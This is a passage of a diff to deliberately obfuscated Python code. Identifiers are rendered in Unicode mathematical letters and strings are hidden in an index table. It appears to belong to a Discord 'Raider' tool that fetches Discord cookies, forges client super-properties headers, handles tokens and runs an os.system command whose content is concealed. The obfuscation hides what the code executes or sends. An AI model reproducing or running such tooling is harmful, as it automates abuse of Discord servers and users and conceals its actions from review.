𝗹𝗳.size)}{𝘐𝘕𝙄𝘕𝗹𝗹𝙄𝙈𝙄𝘐𝘭𝘔𝘭𝙡𝗜𝗹𝘭𝘕𝘕𝘐𝘭𝗹𝗠𝗡𝘭𝘕𝙡𝙈𝙄𝙈𝗜𝘔[63]}{𝘐𝘕𝙄𝗡𝙡𝙡𝗜𝙈𝘐𝙄𝘭𝘔𝙡𝗹𝘐𝗹𝗹𝙉𝗡𝘐𝗹𝘭𝙈𝙉𝗹𝗡𝗹𝙈𝗜𝘔𝗜𝙈[87].center(𝙨𝗲𝘭𝘧.size)}{𝘐𝙉𝘐𝘕𝙡𝗹𝙄𝗠𝙄𝙄𝗹𝗠𝗹𝙡𝗜𝗹𝘭𝗡𝘕𝘐𝗹𝙡𝘔𝙉𝙡𝗡𝘭𝘔𝘐𝙈𝗜𝘔[63]}{𝗜𝙉𝘐𝙉𝘭𝙡𝘐𝗠𝘐𝘐𝗹𝙈𝙡𝘭𝙄𝙡𝘭𝘕𝙉𝘐𝘭𝙡𝗠𝗡𝙡𝙉𝗹𝙈𝘐𝙈𝘐𝘔[88].center(𝘀𝗲𝗹𝙛.size)}{𝙄𝗡𝙄𝘕𝗹𝘭𝗜𝗠𝘐𝗜𝗹𝘔𝙡𝗹𝙄𝘭𝙡𝗡𝙉𝙄𝗹𝗹𝙈𝙉𝘭𝗡𝗹𝘔𝘐𝙈𝗜𝘔[63]}{𝙄𝗡𝙄𝙉𝙡𝙡𝘐𝙈𝗜𝘐𝗹𝗠𝘭𝘭𝘐𝗹𝗹𝘕𝗡𝗜𝘭𝙡𝙈𝗡𝘭𝗡𝘭𝘔𝘐𝘔𝗜𝙈[89].center(𝘴𝗲𝘭𝗳.size)}{𝗜𝙉𝗜𝘕𝘭𝙡𝙄𝗠𝗜𝘐𝙡𝗠𝗹𝗹𝙄𝗹𝗹𝙉𝗡𝘐𝗹𝘭𝗠𝙉𝘭𝗡𝗹𝙈𝘐𝙈𝘐𝙈[63]}'
+        for 𝘦𝘥𝙜𝘦 in 𝙚𝗱𝙜𝙚𝘀:
+            𝙩𝘪𝙩𝙡𝙚 = 𝙩𝗶𝙩𝗹𝗲.replace(𝘦𝗱𝘨𝙚, f'{𝘍𝗼𝘳𝗲.LIGHTCYAN_EX}{𝘦𝙙𝘨𝘦}{𝗙𝗼𝗿𝙚.RESET}')
+        𝙥𝗿𝗶𝙣𝘵(𝙩𝙞𝙩𝙡𝗲)
+        𝗼𝘀.system(𝗜𝙉𝘐𝗡𝙡𝘭𝘐𝗠𝗜𝘐𝙡𝘔𝙡𝘭𝗜𝗹𝗹𝙉𝙉𝘐𝙡𝘭𝙈𝙉𝙡𝘕𝗹𝗠𝙄𝙈𝘐𝙈[90])
 
     def run(self):
-        𝘰𝗽𝘁𝗶𝗼𝙣𝘀 = [𝘴𝗲𝙡𝙛.render_ascii(), 𝘀𝗲𝘭𝗳.raider_options()]
-        ([𝙤𝘱𝘵𝙞𝗼𝙣] for 𝗼𝙥𝘵𝘪𝘰𝙣 in 𝗼𝙥𝘁𝘪𝙤𝘯𝙨)
+        𝗼𝙥𝘁𝙞𝗼𝗻𝘀 = [𝙨𝙚𝗹𝗳.render_ascii(), 𝘀𝗲𝘭𝘧.raider_options()]
+        ([𝙤𝙥𝘁𝙞𝘰𝘯] for 𝘰𝙥𝘵𝘪𝘰𝙣 in 𝘰𝗽𝘁𝘪𝗼𝙣𝘀)
 
     def log(self, text=None, color=None, token=None, log=None):
-        𝗿𝗲𝘴𝘱𝙤𝘯𝘀𝗲 = f'{𝗡𝙈𝙈𝗠𝗡𝘭𝗹𝘔𝗠𝙡𝙈𝘔𝙉𝗹𝘐𝗠𝙄𝙄𝘕𝘔𝘐𝗜𝘔𝙄𝙡𝘐𝘕𝘐𝙈𝙄𝙄𝙈[98]}{𝗙𝘰𝙧𝙚.LIGHTBLACK_EX}{𝘥𝘢𝙩𝗲𝙩𝘪𝘮𝙚.now().strftime(𝗡𝗠𝗠𝘔𝗡𝗹𝗹𝙈𝙈𝙡𝘔𝙈𝗡𝘭𝗜𝘔𝙄𝘐𝙉𝘔𝘐𝗜𝘔𝙄𝗹𝙄𝘕𝘐𝙈𝘐𝘐𝙈[99])}{𝘍𝙤𝗿𝙚.RESET}{𝙉𝘔𝘔𝘔𝗡𝗹𝗹𝙈𝗠𝘭𝗠𝗠𝘕𝙡𝘐𝘔𝘐𝙄𝙉𝘔𝘐𝗜𝘔𝙄𝘭𝗜𝘕𝙄𝘔𝘐𝙄𝗠[100]}'
-        if 𝘁𝙚𝙭𝙩:
-            𝗿𝘦𝘀𝗽𝗼𝙣𝘴𝗲 += f'{𝘕𝙈𝗠𝘔𝙉𝙡𝘭𝙈𝙈𝘭𝘔𝘔𝘕𝗹𝙄𝘔𝘐𝙄𝘕𝘔𝙄𝗜𝗠𝙄𝗹𝙄𝙉𝙄𝘔𝘐𝗜𝘔[98]}{𝙘𝙤𝘭𝗼𝗿}{𝙩𝙚𝙭𝘁}{𝗙𝗼𝘳𝗲.RESET}{𝘕𝘔𝗠𝘔𝘕𝘭𝗹𝗠𝘔𝘭𝗠𝘔𝙉𝗹𝗜𝙈𝙄𝗜𝘕𝗠𝘐𝗜𝗠𝙄𝙡𝗜𝘕𝙄𝘔𝗜𝙄𝘔[100]}'
-        if 𝘁𝗼𝙠𝘦𝙣:
-            𝘳𝘦𝙨𝗽𝘰𝗻𝙨𝗲 += 𝙩𝘰𝘬𝘦𝗻
-        if 𝘭𝘰𝙜:
-            𝗿𝘦𝙨𝗽𝘰𝘯𝘀𝙚 += f'{𝙉𝗠𝗠𝘔𝙉𝗹𝘭𝙈𝗠𝘭𝗠𝘔𝘕𝘭𝘐𝙈𝘐𝘐𝘕𝘔𝘐𝘐𝗠𝘐𝗹𝘐𝘕𝗜𝗠𝘐𝗜𝙈[101]}{𝘍𝘰𝗿𝗲.LIGHTBLACK_EX}{𝗹𝘰𝘨}{𝘍𝘰𝗿𝘦.RESET}{𝘕𝙈𝙈𝙈𝙉𝘭𝙡𝙈𝘔𝙡𝗠𝙈𝙉𝗹𝗜𝙈𝗜𝙄𝘕𝗠𝙄𝘐𝗠𝘐𝙡𝗜𝙉𝗜𝙈𝙄𝙄𝗠[102]}'
-        𝙥𝙧𝙞𝙣𝙩(𝗿𝗲𝙨𝙥𝗼𝘯𝙨𝗲)
+        𝗿𝘦𝙨𝙥𝘰𝘯𝙨𝘦 = f'{𝗜𝗡𝗜𝗡𝘭𝙡𝘐𝘔𝗜𝙄𝘭𝘔𝘭𝙡𝘐𝘭𝗹𝘕𝙉𝙄𝗹𝘭𝘔𝙉𝙡𝙉𝘭𝗠𝙄𝘔𝙄𝙈[91]}{𝙁𝘰𝗿𝗲.LIGHTBLACK_EX}{𝘥𝙖𝙩𝘦𝙩𝗶𝘮𝗲.now().strftime(𝘐𝘕𝘐𝘕𝙡𝘭𝙄𝘔𝗜𝙄𝘭𝘔𝗹𝘭𝗜𝘭𝙡𝙉𝗡𝘐𝗹𝘭𝗠𝙉𝗹𝙉𝘭𝙈𝙄𝙈𝗜𝗠[92])}{𝙁𝗼𝘳𝘦.RESET}{𝗜𝗡𝘐𝗡𝘭𝙡𝘐𝘔𝙄𝗜𝘭𝙈𝙡𝙡𝙄𝘭𝗹𝙉𝗡𝙄𝙡𝙡𝙈𝙉𝘭𝘕𝗹𝘔𝙄𝘔𝙄𝘔[93]}'
+        if 𝘁𝙚𝙭𝘵:
+            𝘳𝙚𝙨𝗽𝗼𝙣𝘴𝘦 += f'{𝙄𝗡𝙄𝙉𝙡𝗹𝙄𝘔𝘐𝗜𝗹𝙈𝗹𝙡𝘐𝙡𝗹𝗡𝙉𝘐𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝙈𝘐𝗠𝗜𝙈[91]}{𝙘𝘰𝘭𝘰𝗿}{𝙩𝘦𝙭𝙩}{𝘍𝙤𝗿𝘦.RESET}{𝙄𝘕𝙄𝙉𝗹𝘭𝗜𝙈𝙄𝘐𝗹𝙈𝙡𝘭𝘐𝘭𝙡𝗡𝘕𝙄𝗹𝙡𝘔𝗡𝙡𝗡𝙡𝘔𝗜𝘔𝘐𝘔[93]}'
+        if 𝘵𝙤𝘬𝗲𝗻:
+            𝘳𝘦𝘀𝗽𝗼𝙣𝘴𝘦 += 𝘁𝗼𝗸𝙚𝗻
+        if 𝙡𝘰𝗴:
+            𝗿𝙚𝘀𝘱𝙤𝙣𝙨𝘦 += f'{𝙄𝗡𝗜𝘕𝗹𝘭𝗜𝘔𝙄𝘐𝘭𝙈𝘭𝗹𝘐𝘭𝙡𝘕𝙉𝙄𝘭𝘭𝙈𝙉𝙡𝙉𝘭𝙈𝘐𝙈𝗜𝘔[94]}{𝙁𝘰𝗿𝙚.LIGHTBLACK_EX}{𝘭𝙤𝗴}{𝗙𝙤𝘳𝘦.RESET}{𝙄𝘕𝘐𝙉𝙡𝘭𝗜𝙈𝙄𝙄𝗹𝙈𝘭𝘭𝗜𝙡𝘭𝘕𝘕𝗜𝗹𝙡𝘔𝗡𝘭𝘕𝗹𝗠𝗜𝘔𝘐𝘔[95]}'
+        𝗽𝘳𝗶𝗻𝙩(𝗿𝙚𝙨𝘱𝘰𝙣𝘴𝘦)
 
     def prompt(self, text, ask=None):
-        𝘳𝘦𝘀𝙥𝙤𝘯𝘴𝗲 = f'{𝘕𝗠𝘔𝙈𝙉𝙡𝘭𝙈𝘔𝘭𝙈𝗠𝘕𝙡𝘐𝘔𝘐𝘐𝗡𝘔𝗜𝘐𝗠𝗜𝙡𝘐𝘕𝙄𝙈𝘐𝙄𝙈[98]}{𝘍𝙤𝘳𝘦.LIGHTCYAN_EX}{𝘁𝘦𝘅𝙩}{𝙁𝘰𝗿𝘦.RESET}'
-        if 𝘢𝘴𝘬:
-            𝘳𝗲𝘴𝗽𝙤𝗻𝘴𝗲 += f'{𝘕𝗠𝗠𝗠𝗡𝗹𝙡𝗠𝘔𝙡𝙈𝙈𝙉𝗹𝗜𝗠𝗜𝙄𝙉𝙈𝘐𝘐𝗠𝗜𝗹𝙄𝘕𝘐𝙈𝗜𝗜𝙈[103]}{𝙁𝗼𝙧𝘦.LIGHTBLACK_EX}{𝘕𝙈𝘔𝗠𝗡𝗹𝗹𝘔𝘔𝘭𝗠𝘔𝘕𝘭𝘐𝙈𝘐𝘐𝘕𝙈𝙄𝘐𝙈𝗜𝘭𝘐𝗡𝙄𝘔𝗜𝙄𝙈[104]}{𝙁𝙤𝘳𝘦.RESET}{𝙉𝘔𝗠𝘔𝘕𝙡𝙡𝙈𝗠𝘭𝙈𝘔𝗡𝙡𝗜𝘔𝗜𝗜𝘕𝙈𝗜𝘐𝘔𝙄𝗹𝗜𝙉𝙄𝗠𝗜𝙄𝘔[105]}'
+        𝗿𝙚𝘴𝘱𝘰𝙣𝘀𝙚 = f'{𝘐𝗡𝙄𝘕𝘭𝙡𝘐𝗠𝘐𝙄𝗹𝙈𝙡𝘭𝘐𝘭𝘭𝙉𝙉𝙄𝘭𝙡𝙈𝙉𝙡𝙉𝗹𝘔𝘐𝙈𝘐𝘔[91]}{𝙁𝗼𝙧𝙚.LIGHTCYAN_EX}{𝘁𝘦𝙭𝘵}{𝙁𝗼𝘳𝗲.RESET}'
+        if 𝙖𝙨𝙠:
+            𝘳𝙚𝘀𝙥𝙤𝘯𝘀𝗲 += f'{𝙄𝗡𝗜𝗡𝙡𝗹𝙄𝙈𝗜𝗜𝗹𝘔𝘭𝘭𝙄𝙡𝙡𝘕𝗡𝘐𝙡𝗹𝘔𝘕𝗹𝙉𝘭𝙈𝘐𝘔𝗜𝘔[96]}{𝘍𝙤𝗿𝙚.LIGHTBLACK_EX}{𝘐𝘕𝘐𝘕𝗹𝗹𝗜𝙈𝗜𝙄𝗹𝙈𝘭𝘭𝙄𝗹𝘭𝘕𝗡𝗜𝙡𝗹𝗠𝙉𝘭𝘕𝘭𝘔𝘐𝙈𝘐𝘔[97]}{𝙁𝙤𝘳𝗲.RESET}{𝙄𝙉𝙄𝘕𝘭𝘭𝘐𝗠𝙄𝗜𝗹𝘔𝘭𝘭𝘐𝗹𝙡𝘕𝘕𝗜𝗹𝘭𝘔𝘕𝘭𝘕𝘭𝗠𝗜𝗠𝘐𝙈[98]}'
         else:
-            𝘳𝘦𝙨𝘱𝘰𝗻𝙨𝙚 += f'{𝗡𝙈𝘔𝗠𝗡𝘭𝙡𝘔𝙈𝗹𝗠𝘔𝘕𝗹𝘐𝘔𝙄𝘐𝗡𝗠𝙄𝘐𝗠𝙄𝙡𝙄𝙉𝙄𝙈𝗜𝗜𝗠[106]}'
-        return 𝙧𝙚𝙨𝗽𝗼𝗻𝘴𝙚
-𝗰𝘰𝙣𝘴𝗼𝙡𝘦 = 𝙍𝙚𝗻𝙙𝘦𝙧()
+            𝘳𝘦𝘴𝙥𝙤𝘯𝘴𝘦 += f'{𝗜𝗡𝗜𝙉𝘭𝙡𝘐𝗠𝗜𝗜𝗹𝘔𝗹𝙡𝗜𝗹𝗹𝙉𝗡𝘐𝗹𝗹𝙈𝘕𝘭𝙉𝙡𝗠𝘐𝘔𝙄𝙈[99]}'
+        return 𝘳𝙚𝘀𝘱𝗼𝗻𝘴𝗲
+𝗰𝗼𝘯𝙨𝗼𝙡𝙚 = 𝙍𝗲𝘯𝘥𝗲𝘳()
 
 class Raider:
 
     def __init__(self):
-        𝘴𝙚𝘵𝗮𝘵𝘁𝙧(𝘀𝗲𝗹𝗳, 'cookies', 𝘀𝙚𝗹𝙛.get_discord_cookies())
-        𝙨𝘦𝘁𝗮𝘵𝙩𝙧(𝙨𝗲𝙡𝘧, 'props', 𝘀𝗲𝘭𝘧.super_properties())
+        𝘴𝘦𝙩𝗮𝙩𝘁𝙧(𝙨𝗲𝘭𝘧, 'cookies', 𝘴𝗲𝙡𝗳.get_discord_cookies())
+        𝙨𝘦𝘁𝙖𝙩𝘁𝗿(𝘴𝙚𝗹𝙛, 'props', 𝘀𝘦𝙡𝗳.super_properties())
 
     def get_discord_cookies(self):
         try:
-            𝘳𝗲𝙨𝘱𝙤𝘯𝙨𝙚 = 𝙧𝙚𝗾𝘂𝙚𝘴𝘵𝘴.get(𝙉𝗠𝘔𝗠𝗡𝘭𝙡𝗠𝗠𝙡𝙈𝗠𝙉𝙡𝙄𝗠𝗜𝗜𝗡𝗠𝗜𝗜𝗠𝗜𝙡𝘐𝘕𝘐𝙈𝗜𝙄𝗠[107])
-            match 𝙧𝗲𝘴𝗽𝙤𝙣𝘀𝗲.status_code:
+            𝙧𝗲𝘴𝗽𝘰𝗻𝙨𝙚 = 𝗿𝘦𝙦𝘂𝗲𝘴𝘵𝙨.get(𝙄𝙉𝗜𝗡𝘭𝙡𝙄𝙈𝗜𝙄𝙡𝘔𝗹𝙡𝗜𝙡𝘭𝙉𝙉𝙄𝘭𝘭𝗠𝙉𝗹𝗡𝙡𝙈𝘐𝗠𝙄𝘔[100])
+            match 𝙧𝗲𝘴𝗽𝙤𝗻𝘀𝘦.status_code:
                 case 200:
-                    return 𝗡𝗠𝙈𝙈𝗡𝘭𝙡𝘔𝙈𝘭𝗠𝗠𝙉𝘭𝘐𝘔𝙄𝙄𝘕𝙈𝙄𝙄𝘔𝗜𝘭𝗜𝙉𝘐𝘔𝗜𝙄𝙈[108].join([f'{𝙘𝙤𝗼𝗸𝙞𝘦.name}{𝗡𝘔𝘔𝘔𝙉𝗹𝗹𝘔𝙈𝘭𝘔𝗠𝙉𝙡𝘐𝗠𝘐𝙄𝘕𝙈𝗜𝘐𝘔𝘐𝘭𝗜𝗡𝙄𝗠𝗜𝙄𝘔[109]}{𝙘𝘰𝙤𝗸𝙞𝙚.value}' for 𝘤𝗼𝙤𝗸𝙞𝗲 in 𝘳𝗲𝘴𝙥𝙤𝙣𝙨𝗲.cookies])
+                    return 𝗜𝗡𝙄𝘕𝗹𝘭𝗜𝙈𝙄𝙄𝘭𝗠𝘭𝙡𝗜𝘭𝘭𝙉𝙉𝘐𝗹𝗹𝘔𝙉𝙡𝘕𝘭𝘔𝘐𝗠𝗜𝙈[101].join([f'{𝗰𝘰𝗼𝘬𝙞𝗲.name}{𝘐𝗡𝗜𝗡𝘭𝘭𝗜𝗠𝗜𝙄𝗹𝗠𝗹𝙡𝘐𝙡𝙡𝘕𝘕𝗜𝙡𝙡𝘔𝘕𝗹𝗡𝙡𝗠𝙄𝗠𝙄𝗠[102]}{𝙘𝙤𝘰𝗸𝙞𝙚.value}' for 𝘤𝘰𝙤𝘬𝙞𝘦 in 𝘳𝘦𝘀𝙥𝙤𝙣𝙨𝘦.cookies])
                 case _:
-                    return 𝘕𝙈𝘔𝗠𝙉𝘭𝘭𝙈𝘔𝙡𝙈𝘔𝘕𝙡𝗜𝗠𝙄𝙄𝗡𝙈𝙄𝙄𝙈𝘐𝘭𝘐𝘕𝗜𝗠𝙄𝗜𝗠[110]
-        except 𝙀𝘅𝘤𝙚𝙥𝘵𝘪𝘰𝗻 as e:
-            𝗽𝙧𝘪𝙣𝙩(f'{𝘕𝗠𝘔𝙈𝘕𝙡𝙡𝙈𝘔𝘭𝙈𝘔𝙉𝗹𝘐𝗠𝘐𝙄𝘕𝙈𝘐𝙄𝗠𝙄𝗹𝙄𝙉𝙄𝙈𝙄𝘐𝗠[111]}{𝘦}{𝙉𝙈𝙈𝙈𝗡𝙡𝘭𝙈𝗠𝗹𝗠𝗠𝘕𝗹𝙄𝙈𝗜𝗜𝘕𝗠𝗜𝘐𝙈𝗜𝙡𝗜𝙉𝗜𝙈𝘐𝘐𝘔[112]}')
+                    return 𝙄𝗡𝗜𝗡𝗹𝙡𝙄𝘔𝙄𝗜𝗹𝗠𝘭𝘭𝗜𝗹𝗹𝘕𝙉𝙄𝘭𝙡𝘔𝗡𝗹𝙉𝘭𝗠𝗜𝙈𝗜𝘔[103]
+        except 𝘌𝘅𝘤𝗲𝙥𝙩𝙞𝙤𝗻 as e:
+            𝙥𝘳𝘪𝙣𝘁(f'{𝗜𝗡𝗜𝘕𝗹𝙡𝙄𝙈𝙄𝙄𝙡𝗠𝘭𝗹𝙄𝙡𝘭𝙉𝘕𝙄𝘭𝗹𝗠𝘕𝘭𝙉𝙡𝗠𝙄𝙈𝙄𝙈[104]}{𝙚}{𝗜𝘕𝗜𝙉𝘭𝘭𝘐𝗠𝙄𝙄𝗹𝗠𝘭𝘭𝗜𝙡𝗹𝙉𝗡𝗜𝙡𝘭𝙈𝗡𝘭𝙉𝙡𝙈𝗜𝙈𝗜𝘔[105]}')
 
     def super_properties(self):
-        𝗽𝘢𝙮𝙡𝘰𝙖𝗱 = {𝗡𝙈𝗠𝘔𝘕𝘭𝘭𝗠𝘔𝗹𝘔𝙈𝗡𝘭𝘐𝗠𝘐𝙄𝘕𝗠𝗜𝗜𝗠𝘐𝙡𝘐𝘕𝘐𝘔𝙄𝘐𝙈[113]: 𝘕𝙈𝗠𝗠𝗡𝘭𝙡𝙈𝙈𝗹𝘔𝘔𝙉𝗹𝘐𝗠𝘐𝘐𝙉𝙈𝙄𝗜𝗠𝙄𝙡𝘐𝗡𝘐𝘔𝙄𝗜𝗠[125], 𝗡𝘔𝙈𝗠𝘕𝘭𝙡𝙈𝙈𝗹𝗠𝗠𝘕𝘭𝙄𝗠𝗜𝗜𝙉𝘔𝗜𝘐𝙈𝘐𝙡𝘐𝘕𝙄𝘔𝗜𝙄𝙈[114]: 𝙉𝘔𝙈𝙈𝗡𝙡𝘭𝘔𝗠𝙡𝘔𝘔𝘕𝘭𝘐𝗠𝘐𝙄𝘕𝘔𝗜𝗜𝘔𝙄𝘭𝙄𝘕𝙄𝘔𝗜𝗜𝗠[126], 𝘕𝙈𝙈𝙈𝙉𝙡𝙡𝙈𝘔𝘭𝙈𝙈𝘕𝙡𝘐𝙈𝘐𝗜𝘕𝘔𝗜𝗜𝘔𝗜𝙡𝙄𝗡𝗜𝙈𝘐𝗜𝘔[115]: 𝙉𝘔𝗠𝙈𝙉𝙡𝗹𝗠𝗠𝘭𝗠𝙈𝙉𝗹𝙄𝗠𝗜𝘐𝗡𝘔𝘐𝙄𝙈𝙄𝘭𝘐𝗡𝙄𝘔𝘐𝘐𝗠[127], 𝘕𝘔𝗠𝗠𝙉𝗹𝗹𝙈𝗠𝙡𝙈𝘔𝗡𝘭𝙄𝘔𝗜𝙄𝗡𝙈𝙄𝘐𝗠𝘐𝙡𝙄𝙉𝘐𝙈𝘐𝘐𝘔[116]: 𝘕𝗠𝗠𝙈𝘕𝙡𝙡𝙈𝙈𝗹𝘔𝘔𝙉𝘭𝗜𝗠𝘐𝙄𝙉𝘔𝙄𝙄𝙈𝘐𝙡𝗜𝗡𝙄𝙈𝗜𝘐𝗠[128], 𝘕𝗠𝙈𝘔𝘕𝗹𝘭𝘔𝘔𝗹𝗠𝘔𝘕𝙡𝙄𝘔𝘐𝗜𝗡𝘔𝘐𝘐𝗠𝘐𝙡𝗜𝗡𝙄𝗠𝗜𝗜𝗠[117]: 𝙉𝘔𝗠𝙈𝙉𝙡𝙡𝘔𝗠𝗹𝗠𝘔𝗡𝙡𝘐𝗠𝗜𝗜𝙉𝘔𝘐𝙄𝙈𝙄𝙡𝘐𝘕𝗜𝗠𝗜𝗜𝗠[129], 𝘕𝘔𝗠𝙈𝘕𝙡𝘭𝙈𝗠𝘭𝘔𝗠𝙉𝘭𝙄𝘔𝘐𝗜𝘕𝘔𝙄𝗜𝘔𝗜𝗹𝘐𝗡𝙄𝘔𝘐𝘐𝘔[118]: 𝗡𝘔𝙈𝙈𝗡𝘭𝘭𝙈𝘔𝙡𝗠𝙈𝗡𝙡𝘐𝘔𝙄𝘐𝙉𝘔𝘐𝘐𝗠𝗜𝗹𝙄𝗡𝘐𝙈𝙄𝙄𝗠[130], 𝗡𝙈𝗠𝘔𝘕𝙡𝙡𝘔𝗠𝗹𝘔𝙈𝘕𝘭𝘐𝗠𝙄𝘐𝙉𝘔𝗜𝗜𝗠𝙄𝘭𝗜𝗡𝗜𝙈𝗜𝘐𝘔[119]: 𝗡𝘔𝘔𝗠𝗡𝘭𝗹𝙈𝙈𝘭𝙈𝘔𝙉𝘭𝗜𝗠𝘐𝙄𝗡𝘔𝙄𝗜𝘔𝗜𝙡𝗜𝗡𝘐𝗠𝙄𝗜𝘔[131], 𝙉𝙈𝗠𝗠𝗡𝗹𝘭𝙈𝘔𝙡𝘔𝘔𝙉𝗹𝗜𝗠𝙄𝙄𝗡𝘔𝙄𝘐𝙈𝗜𝙡𝙄𝙉𝘐𝙈𝗜𝙄𝘔[120]: 𝘕𝘔𝗠𝗠𝗡𝘭𝗹𝘔𝗠𝙡𝗠𝗠𝘕𝙡𝗜𝙈𝗜𝗜𝘕𝘔𝗜𝘐𝗠𝘐𝘭𝘐𝘕𝙄𝙈𝗜𝘐𝙈[132], 𝙉𝘔𝗠𝗠𝘕𝙡𝙡𝗠𝗠𝗹𝙈𝙈𝙉𝘭𝘐𝘔𝙄𝘐𝗡𝙈𝗜𝗜𝗠𝘐𝗹𝙄𝗡𝗜𝗠𝘐𝙄𝗠[121]: 𝙉𝙈𝘔𝙈𝗡𝘭𝘭𝘔𝙈𝗹𝙈𝙈𝘕𝗹𝙄𝙈𝙄𝘐𝘕𝙈𝗜𝗜𝘔𝙄𝘭𝘐𝗡𝙄𝘔𝙄𝙄𝘔[133], 𝗡𝘔𝙈𝙈𝙉𝙡𝘭𝘔𝙈𝙡𝗠𝙈𝙉𝙡𝘐𝘔𝘐𝗜𝘕𝘔𝘐𝙄𝙈𝗜𝘭𝘐𝙉𝗜𝗠𝘐𝗜𝘔[122]: 226220, 𝗡𝙈𝙈𝘔𝘕𝗹𝙡𝙈𝙈𝗹𝙈𝘔𝙉𝙡𝙄𝗠𝙄𝘐𝘕𝗠𝙄𝙄𝗠𝙄𝗹𝘐𝗡𝘐𝘔𝗜𝙄𝗠[123]: 36442, 𝘕𝙈𝙈𝗠𝘕𝙡𝘭𝘔𝙈𝗹𝗠𝗠𝗡𝘭𝘐𝙈𝙄𝗜𝘕𝗠𝗜𝘐𝗠𝙄𝙡𝗜𝗡𝙄𝙈𝘐𝗜𝘔[124]: None}
-        𝘱𝗿𝙤𝘱𝗲𝙧𝘁𝙞𝙚𝘴 = 𝙗𝘢𝙨𝗲64.b64encode(𝘫𝘀𝗼𝘯.dumps(𝗽𝘢𝘆𝙡𝗼𝘢𝙙).encode()).decode()
-        return 𝗽𝙧𝘰𝘱𝗲𝗿𝙩𝗶𝗲𝘴
+        𝘱𝗮𝙮𝙡𝗼𝗮𝘥 = {𝗜𝗡𝙄𝗡𝗹𝘭𝗜𝗠𝘐𝗜𝗹𝗠𝘭𝙡𝙄𝙡𝘭𝗡𝘕𝘐𝙡𝙡𝙈𝘕𝘭𝘕𝙡𝙈𝗜𝘔𝙄𝘔[106]: 𝘐𝘕𝗜𝘕𝗹𝘭𝗜𝙈𝗜𝗜𝘭𝗠𝙡𝗹𝗜𝘭𝗹𝗡𝗡𝙄𝘭𝘭𝗠𝘕𝙡𝗡𝘭𝘔𝘐𝘔𝗜𝗠[118], 𝗜𝗡𝗜𝙉𝘭𝙡𝙄𝙈𝗜𝗜𝘭𝙈𝘭𝗹𝗜𝗹𝙡𝘕𝘕𝘐𝗹𝙡𝙈𝗡𝗹𝙉𝙡𝙈𝘐𝘔𝗜𝘔[107]: 𝘐𝘕𝙄𝘕𝘭𝙡𝙄𝙈𝙄𝗜𝘭𝗠𝙡𝘭𝗜𝙡𝗹𝗡𝘕𝘐𝗹𝗹𝘔𝗡𝗹𝘕𝗹𝘔𝙄𝘔𝙄𝘔[119], 𝗜𝙉𝗜𝙉𝘭𝗹𝗜𝗠𝙄𝗜𝙡𝙈𝘭𝗹𝗜𝘭𝙡𝘕𝗡𝘐𝗹𝙡𝘔𝙉𝙡𝗡𝘭𝗠𝘐𝙈𝘐𝘔[108]: 𝙄𝙉𝘐𝙉𝘭𝗹𝘐𝘔𝗜𝙄𝗹𝙈𝘭𝗹𝙄𝘭𝘭𝙉𝙉𝘐𝙡𝘭𝘔𝗡𝗹𝗡𝙡𝗠𝘐𝘔𝗜𝗠[120], 𝗜𝘕𝙄𝙉𝙡𝘭𝙄𝙈𝘐𝘐𝗹𝗠𝙡𝘭𝘐𝗹𝗹𝘕𝘕𝘐𝙡𝙡𝗠𝘕𝗹𝘕𝙡𝗠𝗜𝗠𝙄𝘔[109]: 𝗜𝙉𝙄𝗡𝗹𝗹𝗜𝙈𝘐𝗜𝘭𝙈𝗹𝘭𝗜𝗹𝗹𝙉𝗡𝗜𝘭𝙡𝙈𝙉𝗹𝙉𝗹𝙈𝗜𝙈𝙄𝙈[121], 𝙄𝗡𝙄𝗡𝙡𝙡𝗜𝙈𝗜𝘐𝙡𝘔𝘭𝗹𝘐𝙡𝗹𝙉𝙉𝙄𝙡𝘭𝙈𝘕𝗹𝙉𝗹𝙈𝗜𝙈𝗜𝗠[110]: 𝘐𝘕𝘐𝘕𝗹𝗹𝙄𝘔𝙄𝗜𝘭𝙈𝙡𝙡𝗜𝗹𝗹𝘕𝗡𝙄𝘭𝙡𝘔𝙉𝘭𝗡𝘭𝘔𝗜𝘔𝘐𝙈[122], 𝗜𝘕𝘐𝘕𝘭𝙡𝙄𝙈𝘐𝘐𝘭𝘔𝙡𝗹𝘐𝙡𝘭𝙉𝙉𝗜𝗹𝘭𝘔𝘕𝗹𝘕𝘭𝗠𝘐𝗠𝙄𝙈[111]: 𝗜𝙉𝗜𝘕𝗹𝗹𝙄𝘔𝙄𝙄𝗹𝗠𝙡𝘭𝙄𝗹𝙡𝙉𝙉𝘐𝘭𝙡𝗠𝘕𝙡𝗡𝗹𝙈𝘐𝙈𝗜𝘔[123], 𝘐𝗡𝘐𝗡𝘭𝙡𝗜𝗠𝗜𝙄𝘭𝘔𝙡𝙡𝙄𝘭𝗹𝘕𝙉𝙄𝙡𝙡𝗠𝘕𝙡𝗡𝗹𝗠𝘐𝘔𝙄𝘔[112]: 𝗜𝗡𝘐𝗡𝙡𝗹𝙄𝘔𝙄𝘐𝗹𝗠𝗹𝗹𝙄𝙡𝙡𝗡𝘕𝘐𝘭𝗹𝙈𝘕𝘭𝘕𝘭𝘔𝗜𝗠𝙄𝘔[124], 𝗜𝙉𝙄𝗡𝗹𝘭𝙄𝗠𝗜𝗜𝗹𝘔𝘭𝘭𝗜𝙡𝙡𝘕𝙉𝘐𝙡𝘭𝗠𝘕𝙡𝘕𝘭𝗠𝗜𝗠𝘐𝙈[113]: 𝙄𝗡𝙄𝗡𝙡𝗹𝙄𝙈𝘐𝗜𝘭𝘔𝘭𝙡𝘐𝙡𝗹𝙉𝘕𝗜𝗹𝗹𝗠𝘕𝙡𝙉𝙡𝗠𝗜𝗠𝙄𝙈[125], 𝗜𝘕𝘐𝘕𝘭𝗹𝘐𝗠𝙄𝗜𝘭𝗠𝙡𝙡𝙄𝘭𝙡𝘕𝘕𝙄𝘭𝙡𝘔𝙉𝗹𝘕𝗹𝙈𝗜𝙈𝙄𝗠[114]: 𝙄𝗡𝘐𝙉𝗹𝘭𝙄𝘔𝗜𝗜𝙡𝘔𝗹𝙡𝘐𝗹𝙡𝙉𝗡𝙄𝙡𝙡𝗠𝗡𝗹𝙉𝗹𝙈𝘐𝘔𝗜𝗠[126], 𝘐𝘕𝘐𝙉𝘭𝘭𝗜𝘔𝘐𝗜𝗹𝘔𝗹𝗹𝙄𝙡𝘭𝘕𝙉𝘐𝗹𝘭𝗠𝗡𝘭𝘕𝙡𝘔𝙄𝘔𝘐𝙈[115]: 226220, 